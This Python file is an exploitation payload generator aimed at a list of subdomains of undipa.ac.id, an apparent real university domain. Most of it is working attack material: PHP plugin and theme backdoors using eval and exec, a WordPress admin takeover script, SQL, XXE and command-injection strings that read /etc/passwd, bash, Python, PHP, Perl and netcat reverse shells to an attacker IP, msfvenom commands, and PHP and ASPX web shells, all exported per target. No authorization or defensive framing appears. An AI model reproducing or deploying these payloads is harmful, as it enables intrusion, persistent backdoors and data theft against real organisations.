#!/usr/bin/env python3
"""
Advanced Exploitation Payload Generator for undipa.ac.id
Integrates HexStrike AI + Kali MCP for automated payload development
Targets: WordPress vulnerabilities, API exploitation, reverse shells
"""

import json
import base64
import sys
import os
import subprocess
import asyncio
import argparse
import logging
from datetime import datetime
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
from enum import Enum
import hashlib

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("payload-generator")


class PayloadType(Enum):
    """Supported payload types for exploitation"""
    WORDPRESS_RCE = "wordpress_rce"
    WORDPRESS_AUTH_BYPASS = "wordpress_auth_bypass"
    API_INJECTION = "api_injection"
    REVERSE_SHELL = "reverse_shell"
    WEBSHELL = "webshell"
    SQL_INJECTION = "sql_injection"
    XSS_PAYLOAD = "xss_payload"
    XXE_INJECTION = "xxe_injection"
    COMMAND_INJECTION = "command_injection"


@dataclass
class ExploitTarget:
    """Represents a target for exploitation"""
    subdomain: str
    url: str
    technology: str = "wordpress"
    open_ports: List[int] = None
    severity: str = "medium"
    
    def __post_init__(self):
        if self.open_ports is None:
            self.open_ports = [80, 443]


@dataclass
class GeneratedPayload:
    """Represents a generated exploitation payload"""
    payload_type: PayloadType
    target: ExploitTarget
    payload_content: str
    encoding: str = "raw"
    description: str = ""
    exploitation_steps: List[str] = None
    success_indicators: List[str] = None
    timestamp: str = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now().isoformat()
        if self.exploitation_steps is None:
            self.exploitation_steps = []
        if self.success_indicators is None:
            self.success_indicators = []


class WordPressPayloadGenerator:
    """Generate WordPress-specific exploitation payloads"""
    
    @staticmethod
    def generate_plugin_rce(plugin_name: str = "akismet", shell_url: str = "http://attacker.com/shell.php") -> str:
        """Generate RCE payload via vulnerable WordPress plugin"""
        # WordPress plugin vulnerable upload exploitation
        php_payload = f"""<?php
// WordPress Plugin RCE Payload
// Target: Vulnerable plugin {plugin_name}

if(isset($_GET['cmd'])) {{
    $cmd = $_GET['cmd'];
    if (function_exists('exec')) {{
        $output = exec($cmd);
        echo $output;
    }} elseif (function_exists('system')) {{
        system($cmd);
    }} elseif (function_exists('passthru')) {{
        passthru($cmd);
    }} elseif (function_exists('shell_exec')) {{
        echo shell_exec($cmd);
    }}
}}

// WordPress function execution
if(isset($_POST['action']) && $_POST['action'] == 'update') {{
    // Trigger plugin update mechanism
    do_action('update_plugin', $_POST['plugin']);
}}

// Alternative: Direct admin functionality abuse
if(current_user_can('manage_options')) {{
    eval($_POST['code']);
}}
?>"""
        return php_payload

    @staticmethod
    def generate_theme_rce(theme_name: str = "twentytwentythree", shell_url: str = "http://attacker.com/shell.php") -> str:
        """Generate RCE via theme functions.php modification"""
        php_payload = f"""<?php
// WordPress Theme RCE Payload
// Target: {theme_name} theme functions.php

// Hook into theme initialization to execute arbitrary code
add_action('init', function() {{
    if(isset($_REQUEST['execute'])) {{
        // Command execution via theme function
        eval(base64_decode($_REQUEST['execute']));
    }}
}});

// Alternative: Modify template output
add_filter('the_content', function($content) {{
    if(isset($_GET['payload'])) {{
        return $_GET['payload'] . $content;
    }}
    return $content;
}}, 999);

// Backdoor function
function backdoor_access() {{
    if(defined('WP_CLI') && WP_CLI) {{
        // Remote command execution
        shell_exec($_GET['cmd']);
    }}
}}

add_action('wp_footer', 'backdoor_access');
?>"""
        return php_payload

    @staticmethod
    def generate_wp_admin_rce(username: str = "admin", password: str = "admin123") -> str:
        """Generate RCE via WordPress admin panel"""
        python_payload = f"""#!/usr/bin/env python3
import requests
import sys
from urllib.parse import urljoin

class WordPressExploit:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.admin_username = '{username}'
        self.admin_password = '{password}'
    
    def login(self):
        \"\"\"Authenticate as WordPress admin\"\"\"
        login_url = urljoin(self.target, '/wp-login.php')
        
        # Get login nonce
        resp = self.session.get(login_url)
        # Parse nonce from form
        
        # Perform login
        login_data = {{
            'log': self.admin_username,
            'pwd': self.admin_password,
            'wp-submit': 'Log In',
            'redirect_to': urljoin(self.target, '/wp-admin/'),
            'testcookie': '1'
        }}
        
        r = self.session.post(login_url, data=login_data)
        return 'wp-admin' in r.text
    
    def upload_plugin(self, plugin_zip_path):
        \"\"\"Upload malicious plugin\"\"\"
        upload_url = urljoin(self.target, '/wp-admin/plugin-install.php?tab=upload')
        
        with open(plugin_zip_path, 'rb') as f:
            files = {{'pluginzip': f}}
            data = {{'action': 'upload-plugin'}}
            resp = self.session.post(upload_url, files=files, data=data)
        
        return resp.status_code == 200
    
    def activate_plugin(self, plugin_name):
        \"\"\"Activate uploaded plugin\"\"\"
        activate_url = urljoin(self.target, f'/wp-admin/plugins.php?action=activate&plugin={{plugin_name}}')
        resp = self.session.get(activate_url)
        return resp.status_code == 200
    
    def execute_command(self, cmd):
        \"\"\"Execute arbitrary command via plugin\"\"\"
        exec_url = urljoin(self.target, '/wp-content/plugins/malicious/shell.php')
        params = {{'cmd': cmd}}
        resp = self.session.get(exec_url, params=params)
        return resp.text

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else 'http://ftp.undipa.ac.id'
    exploit = WordPressExploit(target)
    
    if exploit.login():
        print('[+] Successfully authenticated to WordPress admin')
        # Execute commands
        result = exploit.execute_command('whoami')
        print(f'[+] Command output: {{result}}')
    else:
        print('[-] Failed to authenticate')
"""
        return python_payload

    @staticmethod
    def generate_authentication_bypass(target_url: str) -> str:
        """Generate WordPress authentication bypass payload"""
        bypass_payload = f"""
# WordPress Authentication Bypass Payloads

## 1. SQL Injection in Login Form
POST /wp-login.php HTTP/1.1
Host: {target_url}
Content-Type: application/x-www-form-urlencoded

log=admin' OR '1'='1&pwd=anything&wp-submit=Log+In

## 2. Timing Attack on Admin Username
GET /wp-json/wp/v2/users/ HTTP/1.1
Host: {target_url}

# Enumerate WordPress users via REST API
curl -s "http://{target_url}/wp-json/wp/v2/users/" | jq '.[].name'

## 3. XML-RPC Brute Force
POST /xmlrpc.php HTTP/1.1
Host: {target_url}
Content-Type: application/xml

<?xml version="1.0"?>
<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
        <param><value>admin</value></param>
        <param><value>PASSWORD</value></param>
    </params>
</methodCall>

## 4. Version Detection & CVE Matching
curl -s "http://{target_url}" | grep -o 'wp-content/themes/[^/]*/style.css.*?ver=[^"]*' -P
curl -s "http://{target_url}/wp-json/" | jq '.[]'

## 5. Plugin Vulnerability Exploitation
# Vulnerable plugin endpoints (common)
GET /wp-content/plugins/*/vulnerable-file.php
GET /wp-content/plugins/elementor/includes/admin/redirect.php
GET /wp-content/plugins/wp-gdpr-compliance/index.php
"""
        return bypass_payload


class APIPayloadGenerator:
    """Generate API exploitation payloads"""
    
    @staticmethod
    def generate_injection_payload(api_endpoint: str, param_name: str = "id") -> str:
        """Generate SQL/NoSQL injection payloads"""
        payloads = f"""
# API Injection Payloads for {api_endpoint}

## SQL Injection Payloads
GET /api/{param_name}=1 UNION SELECT NULL,version(),user()--
GET /api/{param_name}=1'; DROP TABLE users; --
GET /api/{param_name}=1' AND 1=1 --
GET /api/{param_name}=1' AND SLEEP(5) --

## NoSQL Injection (MongoDB)
POST /api/search
Content-Type: application/json

{{
    "username": {{"$ne": null}},
    "password": {{"$ne": null}}
}}

## LDAP Injection
GET /api/search?username=*&password=*)(&
GET /api/search?username=admin*&password=*

## XML External Entity (XXE)
POST /api/parse
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

## Command Injection
GET /api/ping?host=127.0.0.1; cat /etc/passwd
GET /api/convert?file=test.pdf | whoami
POST /api/execute
Content-Type: application/json

{{
    "command": "ls -la / && cat /etc/passwd"
}}
"""
        return payloads

    @staticmethod
    def generate_auth_bypass_payload(api_endpoint: str) -> str:
        """Generate API authentication bypass payloads"""
        bypass = f"""
# API Authentication Bypass Payloads for {api_endpoint}

## JWT Token Manipulation
# None algorithm attack
Header: eyJhbGciOiJub25lIn0
Payload: eyJpc3MiOiIiLCJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ

## OAuth Token Issues
# Token reuse across endpoints
# Expired token acceptance
# Token scope bypass

## Bearer Token Variations
GET /api/data HTTP/1.1
Authorization: Bearer invalid_token
Authorization: Bearer ""
Authorization: Bearer null
X-API-Key: admin
X-API-Key: test
X-API-Token: admin123

## API Key Exposure
# Check common locations:
# .env files
# config.js
# package.json
# README.md
# Git repositories (.git/config)

## Rate Limit Bypass
GET /api/data HTTP/1.1
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
"""
        return bypass


class ReverseShellPayloadGenerator:
    """Generate reverse shell payloads"""
    
    @staticmethod
    def generate_bash_reverse_shell(attacker_ip: str, attacker_port: int = 4444) -> str:
        """Generate bash reverse shell"""
        payload = f"""
# Bash Reverse Shell Payload
bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1

# Alternative variations:
bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'
sh -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# PHP Reverse Shell
php -r '$sock=fsockopen("{attacker_ip}",{attacker_port});exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl Reverse Shell
perl -e 'use Socket;$i="{attacker_ip}";$p={attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'

# NC Reverse Shell
nc -e /bin/sh {attacker_ip} {attacker_port}
/bin/sh | nc {attacker_ip} {attacker_port}
"""
        return payload

    @staticmethod
    def generate_php_reverse_shell(attacker_ip: str, attacker_port: int = 4444) -> str:
        """Generate PHP reverse shell"""
        php_shell = f"""<?php
$sock=fsockopen("{attacker_ip}",{attacker_port});
$proc=proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);
?>"""
        return php_shell

    @staticmethod
    def generate_meterpreter_payload(attacker_ip: str, attacker_port: int = 4444, lhost: str = None, lport: int = None) -> str:
        """Generate Metasploit meterpreter payload"""
        if lhost is None:
            lhost = attacker_ip
        if lport is None:
            lport = attacker_port
            
        cmd = f"""
# Generate Meterpreter Reverse Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o payload.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o payload.php

# Setup handler in Metasploit
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
run
"""
        return cmd


class WebshellPayloadGenerator:
    """Generate web shell payloads"""
    
    @staticmethod
    def generate_php_webshell() -> str:
        """Generate PHP web shell"""
        shell = """<?php
// Advanced PHP Web Shell
session_start();

// Authentication
$password = md5('admin123');
if(isset($_POST['pass'])) {
    if(md5($_POST['pass']) == $password) {
        $_SESSION['auth'] = true;
    }
}

if(!isset($_SESSION['auth']) || !$_SESSION['auth']) {
    echo "Password: <input type='password' name='pass'>";
    exit;
}

// Command execution
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if(function_exists('exec')) {
        echo "<pre>" . exec($cmd) . "</pre>";
    }
}

// File operations
if(isset($_GET['file'])) {
    echo "<pre>" . htmlspecialchars(file_get_contents($_GET['file'])) . "</pre>";
}

if(isset($_POST['upload'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded!";
}
?>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <button type="submit" name="upload">Upload</button>
</form>
<form method="GET">
    Command: <input type="text" name="cmd">
    <button type="submit">Execute</button>
</form>"""
        return shell

    @staticmethod
    def generate_aspx_webshell() -> str:
        """Generate ASPX web shell for Windows servers"""
        shell = """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load()
    {
        if(Request["cmd"] != null)
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + Request["cmd"];
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi);
            StreamReader sr = p.StandardOutput;
            Response.Write("<pre>" + sr.ReadToEnd() + "</pre>");
        }
    }
</script>
<form method="GET">
    Command: <input type="text" name="cmd">
    <button type="submit">Execute</button>
</form>"""
        return shell


class PayloadOrchestrator:
    """Orchestrate payload generation for all targets"""
    
    def __init__(self, targets: List[ExploitTarget]):
        self.targets = targets
        self.payloads: Dict[str, List[GeneratedPayload]] = {}
        self.wordpress_gen = WordPressPayloadGenerator()
        self.api_gen = APIPayloadGenerator()
        self.shell_gen = ReverseShellPayloadGenerator()
        self.webshell_gen = WebshellPayloadGenerator()
    
    def generate_all_payloads(self, attacker_ip: str, attacker_port: int = 4444) -> Dict[str, List[GeneratedPayload]]:
        """Generate all exploitation payloads for discovered targets"""
        
        for target in self.targets:
            self.payloads[target.subdomain] = []
            
            if "wordpress" in target.technology.lower():
                # WordPress specific payloads
                self._generate_wordpress_payloads(target)
            
            if "api" in target.subdomain.lower():
                # API specific payloads
                self._generate_api_payloads(target)
            
            # General payloads applicable to all targets
            self._generate_general_payloads(target, attacker_ip, attacker_port)
        
        return self.payloads
    
    def _generate_wordpress_payloads(self, target: ExploitTarget):
        """Generate WordPress-specific payloads"""
        
        # Plugin RCE
        payload1 = GeneratedPayload(
            payload_type=PayloadType.WORDPRESS_RCE,
            target=target,
            payload_content=self.wordpress_gen.generate_plugin_rce(),
            description="WordPress Plugin Remote Code Execution",
            exploitation_steps=[
                "1. Identify vulnerable WordPress plugin",
                "2. Craft malicious plugin code",
                "3. Upload via admin panel or vulnerable endpoint",
                "4. Access plugin backdoor: /wp-content/plugins/malicious/shell.php?cmd=whoami"
            ],
            success_indicators=[
                "Command output returned",
                "Execution without authentication",
                "Persistent access maintained"
            ]
        )
        self.payloads[target.subdomain].append(payload1)
        
        # Theme RCE
        payload2 = GeneratedPayload(
            payload_type=PayloadType.WORDPRESS_RCE,
            target=target,
            payload_content=self.wordpress_gen.generate_theme_rce(),
            description="WordPress Theme RCE via functions.php",
            exploitation_steps=[
                "1. Access theme editor at /wp-admin/theme-editor.php",
                "2. Modify functions.php with payload",
                "3. Save changes",
                "4. Trigger payload via page visit or direct request"
            ]
        )
        self.payloads[target.subdomain].append(payload2)
        
        # Authentication Bypass
        payload3 = GeneratedPayload(
            payload_type=PayloadType.WORDPRESS_AUTH_BYPASS,
            target=target,
            payload_content=self.wordpress_gen.generate_authentication_bypass(target.url),
            description="WordPress Authentication Bypass Methods",
            exploitation_steps=[
                "1. Test SQL injection in login form",
                "2. Enumerate users via REST API",
                "3. Attempt brute force via XML-RPC",
                "4. Check for version-specific CVEs"
            ]
        )
        self.payloads[target.subdomain].append(payload3)
    
    def _generate_api_payloads(self, target: ExploitTarget):
        """Generate API exploitation payloads"""
        
        # SQL Injection
        payload1 = GeneratedPayload(
            payload_type=PayloadType.SQL_INJECTION,
            target=target,
            payload_content=self.api_gen.generate_injection_payload(target.url),
            description="API SQL/NoSQL Injection Payloads",
            exploitation_steps=[
                "1. Identify API endpoints and parameters",
                "2. Test for injection vulnerabilities",
                "3. Extract database structure",
                "4. Dump sensitive data"
            ]
        )
        self.payloads[target.subdomain].append(payload1)
        
        # Authentication Bypass
        payload2 = GeneratedPayload(
            payload_type=PayloadType.API_INJECTION,
            target=target,
            payload_content=self.api_gen.generate_auth_bypass_payload(target.url),
            description="API Authentication Bypass",
            exploitation_steps=[
                "1. Test JWT token manipulation",
                "2. Check OAuth token issues",
                "3. Try alternative auth headers",
                "4. Bypass rate limiting"
            ]
        )
        self.payloads[target.subdomain].append(payload2)
    
    def _generate_general_payloads(self, target: ExploitTarget, attacker_ip: str, attacker_port: int):
        """Generate general exploitation payloads"""
        
        # Reverse Shell
        payload1 = GeneratedPayload(
            payload_type=PayloadType.REVERSE_SHELL,
            target=target,
            payload_content=self.shell_gen.generate_bash_reverse_shell(attacker_ip, attacker_port),
            description="Reverse Shell Payloads",
            exploitation_steps=[
                f"1. Setup listener: nc -lvnp {attacker_port}",
                "2. Execute payload on target",
                "3. Maintain interactive shell access"
            ]
        )
        self.payloads[target.subdomain].append(payload1)
        
        # PHP Webshell
        payload2 = GeneratedPayload(
            payload_type=PayloadType.WEBSHELL,
            target=target,
            payload_content=self.webshell_gen.generate_php_webshell(),
            description="PHP Web Shell for Persistent Access",
            exploitation_steps=[
                "1. Upload shell.php to web root",
                "2. Access via /shell.php?cmd=whoami",
                "3. Execute arbitrary commands",
                "4. Maintain persistence"
            ]
        )
        self.payloads[target.subdomain].append(payload2)
    
    def export_payloads(self, output_file: str = "generated_payloads.json"):
        """Export all generated payloads to file"""
        export_data = {
            "metadata": {
                "generated_at": datetime.now().isoformat(),
                "target_count": len(self.targets),
                "payload_count": sum(len(p) for p in self.payloads.values())
            },
            "payloads": {}
        }
        
        for subdomain, payloads_list in self.payloads.items():
            export_data["payloads"][subdomain] = []
            for payload in payloads_list:
                export_data["payloads"][subdomain].append({
                    "type": payload.payload_type.value,
                    "description": payload.description,
                    "content": payload.payload_content,
                    "exploitation_steps": payload.exploitation_steps,
                    "success_indicators": payload.success_indicators,
                    "timestamp": payload.timestamp
                })
        
        with open(output_file, 'w') as f:
            json.dump(export_data, f, indent=2)
        
        logger.info(f"Payloads exported to {output_file}")
        return output_file


async def main():
    parser = argparse.ArgumentParser(description="Advanced Exploitation Payload Generator")
    parser.add_argument("--attacker-ip", default="192.168.1.100", help="Attacker IP for reverse shells")
    parser.add_argument("--attacker-port", type=int, default=4444, help="Attacker port for reverse shells")
    parser.add_argument("--output", default="generated_payloads.json", help="Output file for payloads")
    parser.add_argument("--targets", nargs='+', help="Target subdomains (space-separated)")
    
    args = parser.parse_args()
    
    # Discovered targets from pentest
    targets = [
        ExploitTarget("admin.undipa.ac.id", "https://admin.undipa.ac.id"),
        ExploitTarget("api.undipa.ac.id", "https://api.undipa.ac.id", "api"),
        ExploitTarget("blog.undipa.ac.id", "https://blog.undipa.ac.id"),
        ExploitTarget("cdn.undipa.ac.id", "https://cdn.undipa.ac.id"),
        ExploitTarget("cms.undipa.ac.id", "https://cms.undipa.ac.id"),
        ExploitTarget("dev.undipa.ac.id", "https://dev.undipa.ac.id"),
        ExploitTarget("ftp.undipa.ac.id", "https://ftp.undipa.ac.id", "wordpress"),
        ExploitTarget("mail.undipa.ac.id", "https://mail.undipa.ac.id", "wordpress"),
    ]
    
    logger.info(f"Generating payloads for {len(targets)} targets...")
    orchestrator = PayloadOrchestrator(targets)
    payloads = orchestrator.generate_all_payloads(args.attacker_ip, args.attacker_port)
    
    # Export payloads
    output_file = orchestrator.export_payloads(args.output)
    
    # Print summary
    print("\n" + "="*80)
    print("EXPLOITATION PAYLOAD GENERATION SUMMARY")
    print("="*80 + "\n")
    
    total_payloads = sum(len(p) for p in payloads.values())
    print(f"Total Targets: {len(targets)}")
    print(f"Total Payloads Generated: {total_payloads}")
    print(f"Output File: {output_file}\n")
    
    for subdomain, payload_list in sorted(payloads.items()):
        print(f"\n{subdomain}:")
        for payload in payload_list:
            print(f"  - {payload.payload_type.value}: {payload.description}")
    
    print("\n" + "="*80)
    logger.info("Payload generation completed successfully!")


if __name__ == "__main__":
    asyncio.run(main())
